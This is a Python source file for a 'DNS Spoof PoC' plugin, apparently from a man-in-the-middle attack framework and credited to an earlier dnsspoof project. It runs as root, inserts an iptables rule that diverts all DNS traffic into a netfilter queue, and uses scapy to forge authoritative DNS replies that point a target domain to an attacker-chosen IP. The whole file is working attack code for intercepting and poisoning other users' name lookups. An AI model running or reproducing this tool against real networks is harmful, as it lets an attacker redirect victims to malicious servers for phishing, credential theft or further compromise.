#
#Most of this code came from https://github.com/DanMcInerney/dnsspoof
#

from twisted.internet import reactor
from twisted.internet.interfaces import IReadDescriptor
from plugins.plugin import Plugin
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR) #Gets rid of IPV6 Error when importing scapy
from scapy.all import *
import nfqueue
import signal
import os, sys
import threading
from time import sleep

class DNSspoof(Plugin):
    name = "DNS Spoof PoC"
    optname = "dnsspoof"
    desc = 'Redirect DNS requests'
    has_opts = True

    def initialize(self,options):
        '''Called if plugin is enabled, passed the options namespace'''
        self.options = options
        self.domain = options.domain
        self.dnsip = options.dnsip

        if os.geteuid() != 0:
            sys.exit("[-] %s plugin requires root privileges" % self.name)

        #print "[*] Setting up iptables for DNS interception" 
        os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')

        print "[*] DNS Spoof plugin online"
        #signal.signal(signal.SIGINT, self.signal_handler)
        self.start_queue()
        #rctr = threading.Thread(target=reactor.run, args=(False,))
        #rctr.daemon = True
        #rctr.start()

    def start_queue(self):
        self.q = nfqueue.queue()
        self.q.set_callback(self.cb)
        self.q.fast_open(0, socket.AF_INET)
        self.q.set_queue_maxlen(5000)
        reactor.addReader(self)
        self.q.set_mode(nfqueue.NFQNL_COPY_PACKET)
    
    def fileno(self):
        return self.q.get_fd()
    
    def doRead(self):
        self.q.process_pending(100)
    
    def connectionLost(self, reason):
        reactor.removeReader(self)
    
    def logPrefix(self):
        return 'queue'

    def cb(self, i, payload):
        data = payload.get_data()
        pkt = IP(data)
        if not pkt.haslayer(DNSQR):
            payload.set_verdict(nfqueue.NF_ACCEPT)
        else:
            #if self.spoofall:
                #if not self.redirectto:
                    #self.spoofed_pkt(payload, pkt, localIP)
                #else:
                    #self.spoofed_pkt(payload, pkt, self.redirectto)
            if self.domain in pkt[DNS].qd.qname:
                self.spoofed_pkt(payload, pkt)

    def spoofed_pkt(self, payload, pkt):
        spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                      DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=self.dnsip))

        payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(spoofed_pkt), len(spoofed_pkt))
        logging.info("%s Spoofed DNS packet for %s" % (pkt[IP].src, pkt[DNSQR].qname[:-1]))

    def add_options(self, options):
        options.add_argument('--domain', type=str, dest='domain', help='Domain to spoof [e.g google.com]')
        options.add_argument('--dnsip', type=str, dest='dnsip', help='IP address to resolve dns queries to')
    
    #def finish(self):
        #q.unbind(socket.AF_INET)
        #q.close()
